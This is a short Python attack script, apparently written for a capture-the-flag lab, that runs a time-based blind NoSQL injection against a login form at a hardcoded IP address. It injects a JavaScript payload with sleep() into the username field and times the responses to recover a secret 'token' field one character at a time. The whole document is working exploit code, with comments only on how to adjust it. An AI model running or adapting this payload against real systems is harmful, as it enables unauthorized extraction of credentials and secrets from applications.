#!/usr/bin/python3
import httplib2, string, time
from time import time

#Adjust to the victim URL
URL = "http://94.237.54.48:32526/login"
#Adjust if you need less/more chars
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
http = httplib2.Http()
flag = ""
for i in range(50): 
    for char in alphabet:
        #Adjust the URL encoded params in the body
        params = 'username="+||+(function(x){if(x.token[%s]==="%s"){sleep(1000)};}(this))+||+""=="&password=test' %(i, char)
        #Start the timer
        t0 = time()
        send = http.request(URL,method="POST",headers={'Content-Type': 'application/x-www-form-urlencoded'},body=params)[1]
        #Stop the timer
        t1= time() - t0
        #Check if response>1 sec then Blind-Injection is true
        if (t1 > 1):
            flag += char
            print("[+] Flag: " + flag)
            break
